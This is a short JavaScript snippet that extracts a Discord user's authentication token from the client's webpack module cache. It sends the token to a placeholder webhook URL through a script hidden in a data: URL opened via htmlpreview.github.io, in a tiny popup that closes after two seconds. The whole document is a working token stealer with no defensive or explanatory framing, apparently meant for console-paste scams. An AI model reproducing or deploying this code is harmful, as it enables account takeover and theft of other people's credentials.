const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();

    const script = `
        fetch("webhook url", {
            "method": "POST",
            "headers": {
                "Content-Type": "application/json"
            },
            "body": JSON.stringify({
                content: \"${token}\",
            })
        });
    `;

    url = `https://htmlpreview.github.io/?data:text/html,%3Cscript%3E${encodeURIComponent(script)}%3C%2Fscript%3E`;

    win=window.open(url, "", "height=100,width=100");
setTimeout(function() {
    win.close();
}, 2000);
